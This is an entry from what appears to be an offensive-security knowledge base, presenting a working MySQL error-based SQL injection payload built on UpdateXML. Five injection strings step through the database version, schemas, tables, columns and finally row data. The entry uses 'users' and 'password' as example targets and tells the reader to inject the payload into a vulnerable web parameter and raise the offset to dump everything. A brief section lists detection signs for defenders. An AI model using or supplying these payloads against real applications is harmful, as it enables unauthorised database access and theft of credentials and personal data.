---
id: 0d10cb30-f591-446d-b562-da20cdb3490b
name: MySQL-UpdateXML-Schema-and-Table-Extraction-Payload
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.472560+00:00'
updated_at: '2023-04-10T20:22:54.890072+00:00'
platforms:
  - MySQL
tags:
  - sql-injection
  - error-based
  - updatexml
  - schema-enumeration
validated: true
---

# MySQL-UpdateXML-Schema-and-Table-Extraction-Payload

## Code

```sql
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

## Description

This SQL payload uses chained UpdateXML() calls to extract MySQL database metadata and data via error messages. It starts with the version, then iterates over schemas, tables, columns, and finally row data, using delimiters for easy parsing from errors.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| data_offset | Starting index for LIMIT clause to paginate results | 0 |
| data_column | Target schema name for table/column queries | database() or 'app_db' |
| data_table | Target table name for column/data queries | 'users' |
| data_info | Specific column to extract data from | 'password' |

## Usage

Inject this payload into a vulnerable parameter in a web request (e.g., via curl or Burp). Iterate data_offset from 0 upward to dump full lists. Used in error-based SQLi when union-based fails, ideal for reconnaissance in MySQL 5.1+.

## Detection

- WAF rules matching UpdateXML, concat, or information_schema keywords.
- Database logs showing XPATH errors or anomalous SELECTs on system tables.
- Application error pages exposing SQL fragments (indicating poor error handling).
- Increased query volume on information_schema.

## Related

- [[procedures/MySQL-Error-Based-Data-Extraction-Using-UpdateXML]]
- [[tools/sqlmap]]
